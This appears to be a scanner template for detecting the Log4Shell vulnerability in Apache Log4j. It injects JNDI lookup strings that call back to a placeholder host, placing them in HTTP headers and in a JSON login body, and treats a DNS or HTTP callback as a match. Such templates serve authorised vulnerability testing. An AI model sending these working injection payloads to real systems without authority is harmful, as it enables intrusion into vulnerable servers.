id: CVE-2021-44228
info:
  name: Apache Log4j RCE (Log4Shell)
  author: AutoRedTeam
  severity: critical
  description: |
    Apache Log4j2 存在远程代码执行漏洞，攻击者可通过JNDI注入执行任意代码。
    影响版本: 2.0-beta9 至 2.14.1
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://logging.apache.org/log4j/2.x/security.html
  tags: rce, jndi, log4j, cve2021

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      User-Agent: "${jndi:ldap://{{callback}}/a}"
      X-Api-Version: "${jndi:ldap://{{callback}}/b}"
      X-Forwarded-For: "${jndi:ldap://{{callback}}/c}"
      Referer: "${jndi:ldap://{{callback}}/d}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
    matchers-condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/login"
      - "{{BaseURL}}/api/search"
    body: |
      {"username":"${jndi:ldap://{{callback}}/e}","password":"test"}
    headers:
      Content-Type: application/json
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
